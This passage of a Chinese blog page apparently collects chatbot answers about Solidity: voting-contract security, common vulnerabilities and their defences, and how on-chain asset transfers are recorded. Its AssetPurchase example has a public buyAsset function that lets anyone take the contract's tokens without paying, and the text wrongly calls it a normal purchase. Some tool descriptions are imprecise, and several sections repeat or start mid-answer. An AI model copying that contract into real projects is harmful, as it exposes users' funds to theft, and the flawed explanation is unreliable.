溢出&#x2F;下溢攻击（Overflow&#x2F;Underflow）：对于处理投票数等操作的合约，必须防止溢出和下溢错误。Solidity 的版本更新中引入了安全的数学运算，避免了这些问题。<br> 时间戳依赖：智能合约可能会依赖于区块的时间戳来确定投票的有效性。攻击者可能通过调整矿工的时间戳来操控合约行为。开发者应避免过度依赖时间戳。<br> 总结<br> 要确保投票系统中的智能合约不“夹带私货”，首先需要确保合约的代码透明且公开，经过独立审计，并且在设计时避免任何潜在的安全漏洞。通过使用去中心化的网络和共识机制，以及对合约进行形式化验证，可以大大提高合约的可信度和安全性。</li></ol></li></ol><p>如果你在实现智能合约时有任何疑问或者希望了解更多的最佳实践，随时告诉我！<br>3. 可验证的合约代码与逻辑<br>可验证的代码逻辑：合约的核心逻辑应当是透明的、可验证的，特别是对于涉及投票和选举等高风险领域，合约必须确保投票过程中的每一笔交易都可以被追溯、验证且不可篡改。比如，投票合约应该避免一些容易被操纵的漏洞（如重复投票、隐藏投票结果、篡改计票等）。<br>智能合约的验证机制：可以通过形式化验证（Formal Verification）技术对合约逻辑进行数学证明，确保合约在任何情况下都按预期执行，特别是在处理投票时，合约能够确保投票的公正性和正确性。<br>4. 去中心化与信任<br>去中心化：智能合约通常是部署在去中心化的区块链平台上，例如以太坊等。这意味着，合约一旦部署，无法由单一实体修改。这种去中心化特性增加了合约的可信性，因为没有一个中心化的控制者可以修改合约逻辑或操控结果。<br>共识机制：区块链网络的共识机制（如以太坊的 PoW 或 PoS）确保了数据的一致性和安全性。每次合约执行时，都会通过区块链网络中的节点进行验证和记录，因此投票结果一旦提交，不易被篡改。<br>5. 防止恶意操作的设计<br>多重签名和审计：对于投票系统，可以采用多重签名机制，即合约的关键操作需要多个独立的方进行确认，减少单一方恶意篡改的可能性。<br>不可篡改的投票记录：合约应确保投票一旦提交，即不可更改且不可删除，任何投票行为都会被永久记录在区块链上，任何人都可以查证。<br>日志和审计追踪：智能合约应记录所有投票操作的日志，所有投票和更改都应该可以追溯和审计。这可以帮助用户检查是否有不正当的行为或“夹带私货”现象。<br>6. 常见攻击与防范<br>重入攻击（Reentrancy）：在智能合约中，重入攻击可能导致合约执行顺序的错误，进而影响投票或资金转移的结果。开发者需要使用防重入机制，例如在调用外部合约之前先更新状态。<br>溢出&#x2F;下溢攻击（Overflow&#x2F;Underflow）：对于处理投票数等操作的合约，必须防止溢出和下溢错误。Solidity 的版本更新中引入了安全的数学运算，避免了这些问题。<br>时间戳依赖：智能合约可能会依赖于区块的时间戳来确定投票的有效性。攻击者可能通过调整矿工的时间戳来操控合约行为。开发者应避免过度依赖时间戳。<br>总结<br>要确保投票系统中的智能合约不“夹带私货”，首先需要确保合约的代码透明且公开，经过独立审计，并且在设计时避免任何潜在的安全漏洞。通过使用去中心化的网络和共识机制，以及对合约进行形式化验证，可以大大提高合约的可信度和安全性。</p><h2 id="为啥solidity是智能合约的首选语言"><a href="#为啥solidity是智能合约的首选语言" class="headerlink" title="为啥solidity是智能合约的首选语言"></a>为啥solidity是智能合约的首选语言</h2><p>Solidity 能够成为智能合约的首选语言，主要得益于其几个关键特点，使其特别适合在区块链上开发去中心化应用（DApps）和智能合约。以下是一些关键原因：</p><ol><li><p>专为智能合约设计<br>Solidity 是一种专门为以太坊平台（以及其他兼容 EVM 的区块链）设计的编程语言。它的设计目标是使得智能合约的编写更加简单、高效，并能很好地与区块链的去中心化特性兼容。它的语法与 JavaScript 和 C++ 相似，开发者可以快速上手并开始编写智能合约。</p></li><li><p>以太坊兼容性和广泛支持<br>主流区块链平台：Solidity 是以太坊平台的官方智能合约编程语言。以太坊是目前最大的智能合约平台，并且许多其他区块链平台（如 Binance Smart Chain、Polygon、Avalanche 等）也采用了与以太坊虚拟机（EVM）兼容的技术，这使得 Solidity 在区块链开发中成为标准语言。<br>生态系统：以太坊拥有强大的开发者社区和广泛的工具支持。Solidity 的普及使得它在智能合约领域成为了事实上的标准，也促进了大量开发工具、框架和库的出现，如 Truffle、Hardhat 和 OpenZeppelin 等。</p></li><li><p>去中心化和不可篡改性<br>智能合约的执行环境：Solidity 编写的合约部署到区块链上后，代码无法更改，这保证了合约的不可篡改性。区块链的去中心化和共识机制确保了合约按预期执行，无需第三方干预。Solidity 能够确保这种去中心化的特性，使得智能合约能在信任不确定的环境下得到保障。<br>跨平台兼容性：因为 Solidity 编写的合约可以在任何支持 EVM 的区块链平台上运行，它具有良好的跨平台兼容性，可以在多个区块链网络之间迁移。</p></li><li><p>易于开发和调试<br>语法接近其他语言：Solidity 的语法与 JavaScript 和 C++ 等编程语言相似，这使得熟悉这些语言的开发者可以较为轻松地学习和使用 Solidity 编写智能合约。<br>开发工具的支持：有许多开发工具可以帮助开发者更高效地编写、测试和调试 Solidity 合约。例如，Truffle 提供了一个全栈的开发环境，Hardhat 提供了灵活的本地开发和测试框架，OpenZeppelin 提供了可重用的安全合约库。</p></li><li><p>广泛的使用和成熟的社区支持<br>大型项目和应用的支持：Solidity 已经在很多成功的去中心化金融（DeFi）项目、NFT 项目以及其他区块链应用中得到了广泛使用，如 Uniswap、MakerDAO、Compound、Aave 等。这些项目的成功推动了 Solidity 的使用。<br>强大的社区：Solidity 的开发者社区非常活跃，开发者可以通过论坛、GitHub、Discord 等平台获得支持，帮助其快速解决问题并改进代码。社区不断推动语言的更新和演进，及时修复漏洞，增加功能。</p></li><li><p>智能合约的灵活性和扩展性<br>支持多种数据类型和复杂逻辑：Solidity 允许开发者创建复杂的智能合约，支持多种数据类型、结构、映射、事件等，能够应对各种不同的业务逻辑和需求。<br>升级和扩展：Solidity 支持合约的部分升级，虽然智能合约一旦部署就不可修改，但开发者可以通过代理模式、合约继承等方式实现合约的灵活扩展。</p></li><li><p>与区块链技术紧密结合<br>直接与区块链交互：Solidity 提供了与以太坊虚拟机（EVM）直接交互的能力。通过 Solidity 编写的合约可以轻松地与区块链上的其他合约、账户和资产进行交互，这使得它在去中心化应用（DApps）中非常有用。<br>原生支持 Gas 机制：Solidity 代码的执行需要消耗 Gas，这是一种以太坊平台上的资源管理方式。Solidity 中对 Gas 的内建支持，有助于开发者优化合约的效率，避免过度消耗区块链资源。</p></li><li><p>安全性和漏洞防护<br>防止常见安全漏洞：Solidity 语言及其生态系统不断改进，以帮助开发者避免智能合约中的常见漏洞。OpenZeppelin 等库提供了经过审计和验证的智能合约模板，减少了开发者犯错的几率。Solidity 还加入了对溢出、重入攻击等常见安全问题的防范措施。<br>形式化验证：Solidity 合约可以通过形式化验证工具（如 MythX、Slither 等）来检查代码中的安全漏洞，确保智能合约的执行是安全的。</p></li></ol><h2 id="与其他语言的区别"><a href="#与其他语言的区别" class="headerlink" title="与其他语言的区别"></a>与其他语言的区别</h2><ol><li>执行环境：区块链和虚拟机<br>Solidity 是专门为区块链（特别是以太坊和其他 EVM 兼容的区块链）设计的语言。它编写的代码被部署在区块链上，通过以太坊虚拟机（EVM）执行，且合约一旦部署不可更改。这使得 Solidity 与其他传统语言（如 JavaScript、Python）不同，因为它涉及到智能合约的不可篡改性和去中心化的执行环境。</li></ol><p>传统编程语言（如 JavaScript、Python 等）则主要用于开发在中央服务器或客户端上执行的应用程序，不涉及直接与区块链交互。</p><p>| 传统语言在单一服务器上，我运行python在需要在服务器上安装python解释器<br>| solidity是直接操作区块链的？<br>2. 不可变性和持久性<br>Solidity 中编写的智能合约一旦部署到区块链上，它们就变得不可修改和不可删除。这种不可变性是区块链的核心特性，确保了合约在执行时的透明性和安全性。<br>其他编程语言（如 JavaScript、C++ 等）中的代码可以随时修改、删除或更新，通常没有像区块链那样的去中心化和不可变的机制。<br>3. Gas 和资源消耗<br>Solidity 中的每个操作（如计算、存储、读取数据等）都需要消耗“Gas”，这是区块链上的计算资源。Gas 的使用需要付费，这对合约的设计和优化有直接影响。开发者需要考虑如何减少 Gas 消耗，优化智能合约的效率。<br>其他编程语言（如 Python、JavaScript 等）不涉及 Gas 或区块链上的计算费用，它们的代码执行通常由中央服务器提供资源，并且不存在资源消耗的收费机制。<br>4. 数据存储<br>Solidity 中的数据存储是分布式的，存储在区块链上。这意味着数据在所有节点中复制，并且不可篡改。合约的数据存储通过 state variables 管理，存储在区块链的状态中。<br>其他语言（如 Python、JavaScript）中，数据通常存储在本地数据库或内存中，开发者可以自由修改或删除数据。没有像区块链中的去中心化存储机制。</p><p>如果在 Solidity 中编写的智能合约具有重大的缺陷或安全漏洞，可能会带来严重的后果，因为一旦合约被部署到区块链上，它就是不可篡改的。由于区块链的去中心化和不可修改性，合约中的缺陷或者漏洞无法直接修复。如果没有适当的预防和审计措施，漏洞可能会被攻击者利用，导致资金丢失、数据泄露或其他灾难性后果。</p><p>以下是一些可能导致重大发生的安全问题及应对策略：</p><ol><li>重入攻击（Reentrancy Attack）<br>问题：攻击者可以通过外部调用的方式，递归地调用合约的函数，导致状态更新前执行错误，可能导致资金被盗。<br>示例：最著名的重入攻击发生在 2016 年的 DAO 攻击事件中，黑客利用了一个重入漏洞，窃取了大量以太坊。<br>防御方法：<br>使用“检查-效应-交互”模式：即先修改状态，然后再进行外部调用。<br>使用 ReentrancyGuard 库，防止在同一交易中多次调用同一函数。</li><li>整数溢出&#x2F;下溢（Integer Overflow&#x2F;Underflow）<br>问题：如果没有适当的检查，整数变量可能会溢出或下溢，导致错误的计算结果或状态更新，从而可能被恶意利用。<br>防御方法：<br>使用 SafeMath 库来执行安全的加法、减法、乘法等操作。<br>在 Solidity 0.8.x 版本中，溢出和下溢检查已经成为默认行为，但对于旧版本，使用 SafeMath 仍然是一个好习惯。</li><li>访问控制不当（Improper Access Control）<br>问题：智能合约可能没有足够的访问控制，导致未经授权的用户可以执行敏感操作（如更改合约状态、转账资金等）。<br>防御方法：<br>使用 onlyOwner 或其他访问控制模式来确保只有合约的所有者或特定角色可以执行敏感操作。<br>使用 OpenZeppelin 的 Ownable 合约或者 AccessControl 来管理权限。</li><li>竞态条件（Race Conditions）<br>问题：在多个用户同时与合约交互时，可能会导致合约状态的不一致，攻击者可以利用这些漏洞。<br>防御方法：<br>使用锁机制（如 ReentrancyGuard）来确保合约的状态在同一时间只有一个事务在进行。<br>适当使用区块时间戳和不可变的交易顺序来防止竞态条件。</li><li>资金安全问题（Unsafe Ether Transfers）<br>问题：直接使用 transfer 或 send 可能导致安全问题，特别是在合约与外部合约交互时，可能发生意外的行为（例如，接收方合约执行回调时可能引发重入攻击）。<br>防御方法：<br>使用 call 代替 transfer 或 send，并且始终检查返回值。<br>对外部合约调用进行充分的安全检查和审计。</li><li>缺乏审计（Lack of Audits）<br>问题：没有经过第三方的专业审计，可能导致合约中隐藏漏洞，未被开发者发现。<br>防御方法：<br>在部署前进行全面的代码审计，尤其是对涉及资金或敏感操作的合约。<br>使用自动化工具（如 MythX、Slither）来检测潜在的漏洞。<br>使用经过安全审计的库和框架（例如 OpenZeppelin）来减少漏洞的风险。</li><li>升级合约（Upgradable Contracts）<br>问题：一旦合约部署，它是不可修改的。如果发现漏洞或需要添加新功能，原本的合约无法直接升级。<br>防御方法：<br>使用代理模式（Proxy Pattern），通过代理合约进行更新，保持合约的可升级性。可以使用 OpenZeppelin 的代理合约框架来实现这一点。<br>设计合约时要考虑到未来可能需要更新的场景，避免完全依赖一个不可修改的合约。</li><li>Oracle 问题（Oracle Problem）<br>问题：智能合约通常依赖于外部数据源（Oracle）来获取链外信息。如果 Oracle 数据源不可靠或者被攻击，可能会导致合约执行错误或不符合预期的结果。<br>防御方法：<br>使用去中心化的 Oracle 服务（如 Chainlink）来减少单点故障的风险。<br>在合约中实现适当的验证机制，确保来自 Oracle 的数据准确可靠。<br>总结<br>智能合约部署到区块链后不可篡改，因此在开发阶段必须特别注意代码的安全性和漏洞的修复。为避免合约中出现重大的缺陷或安全漏洞，开发者应遵循最佳实践，并通过多种手段进行防范：</li></ol><p>使用标准的安全库（如 OpenZeppelin、SafeMath）来减少漏洞。<br>在发布前进行全面的审计，确保代码符合安全规范。<br>使用自动化工具对代码进行静态分析和漏洞扫描。<br>定期进行代码审查和审计，及时发现潜在的安全风险。<br>即使如此，仍然无法完全消除所有风险，因此在开发合约时，考虑到安全性并做好漏洞防护是至关重要的。如果合约中存在重大的安全漏洞，可能会导致资金丢失或其他严重后果，这也突出了安全审计的重要性。</p><h2 id="solidity主要用在干什么-比如java-python-可以进行web开发，应用开发，为什么非要solidity呢"><a href="#solidity主要用在干什么-比如java-python-可以进行web开发，应用开发，为什么非要solidity呢" class="headerlink" title="?solidity主要用在干什么  比如java python 可以进行web开发，应用开发，为什么非要solidity呢"></a>?solidity主要用在干什么  比如java python 可以进行web开发，应用开发，为什么非要solidity呢</h2><p>Solidity 的应用场景是去中心化的区块链平台，尤其是以太坊（Ethereum）及其他兼容以太坊虚拟机（EVM）的平台。因此，Solidity 的使用并不涉及传统的应用开发或 Web 开发，而是涉及到区块链上的合约逻辑，尤其是涉及到资产转移、去中心化金融（DeFi）、治理、NFTs、代币发行等领域。</p><ol><li>智能合约<br>定义：智能合约是存储在区块链上的自动化程序，它们能够在满足特定条件时自动执行合约条款。智能合约允许没有中介的情况下进行交易和协议执行，降低了信任成本。<br>为什么需要 Solidity：Java 和 Python 等语言通常用于中央化的应用开发，而区块链上的智能合约需要执行在去中心化的环境中，必须具有不可篡改性、透明性和安全性。Solidity 使得编写、部署和执行智能合约成为可能，尤其是与以太坊这样的区块链平台兼容。</li><li>去中心化应用（DApps）<br>定义：去中心化应用（DApps）是建立在区块链上的应用，具有去中心化、开放性、透明性等特征。DApps 不依赖于传统的中央服务器，而是使用智能合约来管理应用逻辑。<br>为什么需要 Solidity：在 DApp 中，前端通常与传统技术栈（如 JavaScript、React）结合使用，但合约逻辑和交易管理是通过 Solidity 编写的。这是因为区块链网络上的数据需要通过智能合约来管理和处理，Solidity 提供了这种功能。</li><li>去中心化金融（DeFi）<br>定义：去中心化金融（DeFi）指的是建立在区块链上的一系列金融服务，如借贷、交易、保险等，没有中介参与，所有操作都由智能合约执行。<br>为什么需要 Solidity：DeFi 应用需要通过智能合约自动执行复杂的金融交易，比如借贷、资产交换和衍生品合约。Solidity 是开发这些智能合约的核心语言，允许开发者设计和管理 DeFi 协议。</li><li>代币和NFT（非同质化代币）<br>定义：代币和 NFTs 是区块链上的数字资产。代币通常用于代表某种资产或权益，而 NFT 是独一无二的数字资产，通常用于表示艺术品、收藏品、游戏物品等。<br>为什么需要 Solidity：Solidity 可以用来创建代币标准（如 ERC-20 和 ERC-721），并在区块链上生成这些代币或 NFT。通过 Solidity，开发者可以在以太坊等平台上实现发行、转移和管理代币的功能。</li><li>区块链治理<br>定义：区块链治理涉及到对去中心化网络和协议进行管理和决策的过程。它通常通过投票或分配权利来做出决策。<br>为什么需要 Solidity：许多去中心化组织（DAO）使用智能合约来管理投票和决策过程。Solidity 可以编写治理合约，通过智能合约自动执行选举、提案等流程，确保治理的透明性和自动化。</li><li>去中心化身份（DID）<br>定义：去中心化身份（DID）是一种基于区块链的身份管理系统，允许个人控制和管理自己的身份信息，不依赖于传统的身份提供者。<br>为什么需要 Solidity：通过 Solidity，可以编写管理去中心化身份的智能合约，确保身份数据的隐私性和安全性，用户可以控制自己的身份信息，并授权特定操作。</li><li>供应链管理<br>定义：供应链管理是指管理商品和服务流通的过程，确保产品从生产到消费的每个环节都能被追踪和验证。<br>为什么需要 Solidity：通过 Solidity 编写的智能合约可以用于追踪供应链中的商品流通，确保每个环节的数据是透明和不可篡改的，增加供应链的可信度。<br>为什么需要 Solidity，而不是传统的编程语言？<br>区块链的去中心化特性：</li></ol><p>在传统的应用开发中（如 Java 或 Python），你通常在中央服务器或客户端上运行程序，而区块链是去中心化的，所有计算和存储都分布在多个节点上。Solidity 允许开发者编写的代码能在这种去中心化环境中执行。<br>不可篡改性和透明性：</p><p>区块链上的数据一旦存储就不可更改，这对于智能合约的执行至关重要。Solidity 是为这种特性量身定制的，它确保部署到区块链上的合约代码是不可修改且可以被所有人透明查看的。<br>与区块链兼容性：</p><p>Solidity 是与区块链（特别是以太坊）的虚拟机（EVM）兼容的编程语言，直接面向区块链的数据结构和操作。而传统语言（如 Java 或 Python）并不直接支持与区块链的集成，通常需要通过中介层（如 Web3.js 或 Web3.py）与区块链进行交互。<br>Gas 和交易费用：</p><p>Solidity 程序的执行依赖于区块链的 Gas 机制。每次执行合约时，用户需要支付一定的费用，称为 Gas，用以补偿网络计算资源的消耗。传统编程语言不涉及这样的资源消耗机制。<br>总结<br>虽然 Java 和 Python 是非常强大的编程语言，适用于 Web 开发、应用开发等多种场景，但它们并不具备直接与区块链交互的能力。Solidity 是专门为区块链环境设计的，能够编写智能合约、管理去中心化资产和执行区块链上的交易逻辑。只有通过 Solidity，我们才能在去中心化网络上创建能够自动执行、不可篡改的合约，从而支持像 DeFi、NFT、DAO 等新兴的区块链应用。因此，Solidity 是智能合约和去中心化应用开发的首选语言。</p><p>Solidity 是一种专门为 <strong>区块链</strong> 和 <strong>智能合约</strong> 设计的编程语言，主要用于在区块链平台上编写和部署智能合约。与 Java、Python 等传统编程语言不同，Solidity 的应用场景是去中心化的区块链平台，尤其是以太坊（Ethereum）及其他兼容以太坊虚拟机（EVM）的平台。因此，Solidity 的使用并不涉及传统的应用开发或 Web 开发，而是涉及到区块链上的合约逻辑，尤其是涉及到资产转移、去中心化金融（DeFi）、治理、NFTs、代币发行等领域。</p><p>以下是 Solidity 的主要应用场景和它为什么在这些领域中至关重要：</p><h3 id="1-智能合约"><a href="#1-智能合约" class="headerlink" title="1. 智能合约"></a>1. <strong>智能合约</strong></h3><ul><li><strong>定义</strong>：智能合约是存储在区块链上的自动化程序，它们能够在满足特定条件时自动执行合约条款。智能合约允许没有中介的情况下进行交易和协议执行，降低了信任成本。</li><li><strong>为什么需要 Solidity</strong>：Java 和 Python 等语言通常用于中央化的应用开发，而区块链上的智能合约需要执行在去中心化的环境中，必须具有不可篡改性、透明性和安全性。Solidity 使得编写、部署和执行智能合约成为可能，尤其是与以太坊这样的区块链平台兼容。</li></ul><h3 id="2-去中心化应用（DApps）"><a href="#2-去中心化应用（DApps）" class="headerlink" title="2. 去中心化应用（DApps）"></a>2. <strong>去中心化应用（DApps）</strong></h3><ul><li><strong>定义</strong>：去中心化应用（DApps）是建立在区块链上的应用，具有去中心化、开放性、透明性等特征。DApps 不依赖于传统的中央服务器，而是使用智能合约来管理应用逻辑。</li><li><strong>为什么需要 Solidity</strong>：在 DApp 中，前端通常与传统技术栈（如 JavaScript、React）结合使用，但合约逻辑和交易管理是通过 Solidity 编写的。这是因为区块链网络上的数据需要通过智能合约来管理和处理，Solidity 提供了这种功能。</li></ul><h3 id="3-去中心化金融（DeFi）"><a href="#3-去中心化金融（DeFi）" class="headerlink" title="3. 去中心化金融（DeFi）"></a>3. <strong>去中心化金融（DeFi）</strong></h3><ul><li><strong>定义</strong>：去中心化金融（DeFi）指的是建立在区块链上的一系列金融服务，如借贷、交易、保险等，没有中介参与，所有操作都由智能合约执行。</li><li><strong>为什么需要 Solidity</strong>：DeFi 应用需要通过智能合约自动执行复杂的金融交易，比如借贷、资产交换和衍生品合约。Solidity 是开发这些智能合约的核心语言，允许开发者设计和管理 DeFi 协议。</li></ul><h3 id="4-代币和NFT（非同质化代币）"><a href="#4-代币和NFT（非同质化代币）" class="headerlink" title="4. 代币和NFT（非同质化代币）"></a>4. <strong>代币和NFT（非同质化代币）</strong></h3><ul><li><strong>定义</strong>：代币和 NFTs 是区块链上的数字资产。代币通常用于代表某种资产或权益，而 NFT 是独一无二的数字资产，通常用于表示艺术品、收藏品、游戏物品等。</li><li><strong>为什么需要 Solidity</strong>：Solidity 可以用来创建代币标准（如 ERC-20 和 ERC-721），并在区块链上生成这些代币或 NFT。通过 Solidity，开发者可以在以太坊等平台上实现发行、转移和管理代币的功能。</li></ul><h3 id="5-区块链治理"><a href="#5-区块链治理" class="headerlink" title="5. 区块链治理"></a>5. <strong>区块链治理</strong></h3><ul><li><strong>定义</strong>：区块链治理涉及到对去中心化网络和协议进行管理和决策的过程。它通常通过投票或分配权利来做出决策。</li><li><strong>为什么需要 Solidity</strong>：许多去中心化组织（DAO）使用智能合约来管理投票和决策过程。Solidity 可以编写治理合约，通过智能合约自动执行选举、提案等流程，确保治理的透明性和自动化。</li></ul><h3 id="6-去中心化身份（DID）"><a href="#6-去中心化身份（DID）" class="headerlink" title="6. 去中心化身份（DID）"></a>6. <strong>去中心化身份（DID）</strong></h3><ul><li><strong>定义</strong>：去中心化身份（DID）是一种基于区块链的身份管理系统，允许个人控制和管理自己的身份信息，不依赖于传统的身份提供者。</li><li><strong>为什么需要 Solidity</strong>：通过 Solidity，可以编写管理去中心化身份的智能合约，确保身份数据的隐私性和安全性，用户可以控制自己的身份信息，并授权特定操作。</li></ul><h3 id="7-供应链管理"><a href="#7-供应链管理" class="headerlink" title="7. 供应链管理"></a>7. <strong>供应链管理</strong></h3><ul><li><strong>定义</strong>：供应链管理是指管理商品和服务流通的过程，确保产品从生产到消费的每个环节都能被追踪和验证。</li><li><strong>为什么需要 Solidity</strong>：通过 Solidity 编写的智能合约可以用于追踪供应链中的商品流通，确保每个环节的数据是透明和不可篡改的，增加供应链的可信度。</li></ul><h3 id="为什么需要-Solidity，而不是传统的编程语言？"><a href="#为什么需要-Solidity，而不是传统的编程语言？" class="headerlink" title="为什么需要 Solidity，而不是传统的编程语言？"></a>为什么需要 Solidity，而不是传统的编程语言？</h3><ol><li><p><strong>区块链的去中心化特性</strong>：</p><ul><li>在传统的应用开发中（如 Java 或 Python），你通常在中央服务器或客户端上运行程序，而区块链是去中心化的，所有计算和存储都分布在多个节点上。Solidity 允许开发者编写的代码能在这种去中心化环境中执行。</li></ul></li><li><p><strong>不可篡改性和透明性</strong>：</p><ul><li>区块链上的数据一旦存储就不可更改，这对于智能合约的执行至关重要。Solidity 是为这种特性量身定制的，它确保部署到区块链上的合约代码是不可修改且可以被所有人透明查看的。</li></ul></li><li><p><strong>与区块链兼容性</strong>：</p><ul><li>Solidity 是与区块链（特别是以太坊）的虚拟机（EVM）兼容的编程语言，直接面向区块链的数据结构和操作。而传统语言（如 Java 或 Python）并不直接支持与区块链的集成，通常需要通过中介层（如 Web3.js 或 Web3.py）与区块链进行交互。</li></ul></li><li><p><strong>Gas 和交易费用</strong>：</p><ul><li>Solidity 程序的执行依赖于区块链的 Gas 机制。每次执行合约时，用户需要支付一定的费用，称为 Gas，用以补偿网络计算资源的消耗。传统编程语言不涉及这样的资源消耗机制。</li></ul></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>虽然 Java 和 Python 是非常强大的编程语言，适用于 Web 开发、应用开发等多种场景，但它们并不具备直接与区块链交互的能力。Solidity 是专门为区块链环境设计的，能够编写智能合约、管理去中心化资产和执行区块链上的交易逻辑。只有通过 Solidity，我们才能在去中心化网络上创建能够自动执行、不可篡改的合约，从而支持像 DeFi、NFT、DAO 等新兴的区块链应用。因此，Solidity 是智能合约和去中心化应用开发的首选语言。</p><h2 id="？你说solidity用作去中心，记录资产来去，移动，比如我买了一个链上的资产-所有人都知道了我的资产-10-意思是solidity编写的合约会自动记录我的资产-10，发布到链上"><a href="#？你说solidity用作去中心，记录资产来去，移动，比如我买了一个链上的资产-所有人都知道了我的资产-10-意思是solidity编写的合约会自动记录我的资产-10，发布到链上" class="headerlink" title="？你说solidity用作去中心，记录资产来去，移动，比如我买了一个链上的资产 所有人都知道了我的资产-10 意思是solidity编写的合约会自动记录我的资产-10，发布到链上?"></a>？你说solidity用作去中心，记录资产来去，移动，比如我买了一个链上的资产 所有人都知道了我的资产-10 意思是solidity编写的合约会自动记录我的资产-10，发布到链上?</h2><p>是的，你的理解是正确的！Solidity 编写的智能合约可以自动管理链上资产的转移，并将所有操作记录在区块链上。具体来说，当你通过智能合约购买一个链上的资产时，合约会自动执行相关操作，比如更新你的余额、转移资产，并将这些变化提交到区块链上。这些操作会被所有参与者和节点所验证，并不可篡改地记录在区块链中。</p><p>让我们具体看看这个过程：</p><h3 id="1-资产转移的过程"><a href="#1-资产转移的过程" class="headerlink" title="1. 资产转移的过程"></a>1. <strong>资产转移的过程</strong></h3><p>假设你在一个基于以太坊的去中心化应用（DApp）中购买资产。资产可能是某种代币、NFT（非同质化代币）或者是其他形式的资产。这时，你和智能合约的交互大致会是这样的：</p><ul><li><p><strong>合约定义资产转移逻辑</strong>：Solidity 合约会定义一些函数，用来管理资产的转移。例如，当你购买某个资产时，合约会检查你账户中的余额，确保你有足够的资金，并在成功交易后更新你的余额。</p></li><li><p><strong>发起交易</strong>：你发起购买请求，这通常通过你的钱包（例如 MetaMask）与智能合约进行交互。在这时，你的钱包会通过网络发送交易请求到区块链网络。</p></li><li><p><strong>智能合约执行</strong>：合约接收到你的交易请求后，它会检查条件（例如，你的余额是否足够）。如果条件满足，合约会更新区块链上的数据，比如减少你的余额并转移资产给你。</p></li></ul><h3 id="2-智能合约的工作原理"><a href="#2-智能合约的工作原理" class="headerlink" title="2. 智能合约的工作原理"></a>2. <strong>智能合约的工作原理</strong></h3><p>让我们假设你正在使用一个 ERC-20 代币智能合约来购买资产。智能合约中的代码可能是这样的：</p><p>solidity</p><p>复制代码</p><p><code>pragma solidity ^0.8.0;  interface IERC20 &#123;     function transfer(address recipient, uint256 amount) external returns (bool); &#125;  contract AssetPurchase &#123;     IERC20 public token;      constructor(address tokenAddress) &#123;         token = IERC20(tokenAddress);     &#125;      function buyAsset(address buyer, uint256 amount) public &#123;         require(token.transfer(buyer, amount), &quot;Transfer failed&quot;);     &#125; &#125;</code></p><ul><li><strong>构造函数</strong>：这个合约初始化时会设置代币的合约地址。</li><li><strong><code>buyAsset</code> 函数</strong>：当用户调用 <code>buyAsset</code> 函数时，它会尝试通过 <code>transfer</code> 方法将代币转账给买家。这里的转账实际上就是一个资产的移动，你的余额会被减少，并且这次转账会自动记录在区块链上。</li></ul><h3 id="3-区块链如何记录资产变动"><a href="#3-区块链如何记录资产变动" class="headerlink" title="3. 区块链如何记录资产变动"></a>3. <strong>区块链如何记录资产变动</strong></h3><p>区块链的主要特性是 <strong>不可篡改性</strong> 和 <strong>透明性</strong>。当智能合约执行完毕后，所有操作会被打包进一个区块，并添加到区块链中。这个区块链上的记录是公开的，可以被任何人查询。</p><ul><li><p><strong>公开记录</strong>：交易被打包进区块，并被所有网络节点验证。无论是转账、资产购买还是其他操作，都会被记录为一个区块，并永久存储在链上。</p></li><li><p><strong>无法篡改</strong>：一旦数据写入区块链，它就无法被修改或删除。这意味着你购买资产的记录（例如，资产-10）会永久保存在链上，所有人都可以查看，但无法改变。</p></li></ul><h3 id="4-示例：购买资产并记录到区块链"><a href="#4-示例：购买资产并记录到区块链" class="headerlink" title="4. 示例：购买资产并记录到区块链"></a>4. <strong>示例：购买资产并记录到区块链</strong></h3><p>假设你用以太币（ETH）购买了某种代币。智能合约会执行以下操作：</p><ol><li><strong>检查余额</strong>：合约会检查你的账户中是否有足够的以太币来支付购买价格。</li><li><strong>扣除资产</strong>：如果条件满足，合约会从你的账户中扣除购买代币的费用。</li><li><strong>转移资产</strong>：合约将购买的代币转移到你的账户。</li><li><strong>记录交易</strong>：所有的交易数据（比如转账金额、时间、交易双方）会被提交到区块链，其他用户也能查看这个交易。</li></ol><p>通过这样的机制，Solidity 编写的智能合约能够自动处理所有资产的变动，并将其透明、公开地记录在区块链上，确保没有人能篡改或者隐瞒这些交易记录。</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>是的，Solidity 编写的智能合约能够自动管理和记录资产的转移。所有的交易和资产变动都会被记录到区块链上，任何人都可以查询这些记录，确保透明性和不可篡改性。在你的购买过程中，合约会自动更新你的资产（例如余额减少），并将这些变动发布到区块链上，让所有参与者都能看到这些操作。</p><h2 id="链上可以记录交易-初始用户的基本资产从哪来的？"><a href="#链上可以记录交易-初始用户的基本资产从哪来的？" class="headerlink" title="链上可以记录交易 初始用户的基本资产从哪来的？"></a>链上可以记录交易 初始用户的基本资产从哪来的？</h2><p>然而，有一些方法可以间接了解用户资产的来源：</p><h3 id="1-区块链交易历史（链上追溯）"><a href="#1-区块链交易历史（链上追溯）" class="headerlink" title="1. 区块链交易历史（链上追溯）"></a>1. <strong>区块链交易历史（链上追溯）</strong></h3><ul><li><strong>通过链上地址追溯</strong>：区块链是公开透明的，你可以查询一个钱包地址的交易历史，查看它收到的每一笔交易。例如，如果一个用户的钱包地址通过智能合约或其他用户收到了一笔资产转账，你可以查看这笔交易的来源地址，进一步追溯资金的来源。这种追溯过程可以追溯到该用户资产的最早来源。</li><li><strong>链上钱包地址</strong>：用户的钱包地址本身就是一个唯一标识。通过这个地址，你可以查看到所有相关的交易，包括转入和转出。这对于查找资金的来源非常有效。例如，你可以通过查找该地址的历史交易，追溯该钱包的资产来自何处（例如，来自某个交易所的充值，或者某个合约的奖励等）。</li></ul><h3 id="2-智能合约和代币的发行"><a href="#2-智能合约和代币的发行" class="headerlink" title="2. 智能合约和代币的发行"></a>2. <strong>智能合约和代币的发行</strong></h3><ul><li><strong>合约逻辑</strong>：当用户通过智能合约进行交易时，合约本身可能会记录资金的来源。例如，某些代币合约会记录代币的“发行”和“铸造”过程。在某些情况下，你可以通过查阅合约的代码和交易历史，找出用户资产（例如代币）的来源。</li><li><strong>初始代币分发</strong>：很多区块链项目在代币发行时会进行ICO（Initial Coin Offering）或空投（Airdrop），这些代币的来源可以追溯到发行合约。用户如果在某个特定的时刻参与了ICO或者收到空投，那些资产的来源可以在区块链上找到。</li></ul><h3 id="3-Token-Minting-与支付的来源"><a href="#3-Token-Minting-与支付的来源" class="headerlink" title="3. Token Minting 与支付的来源"></a>3. <strong>Token Minting 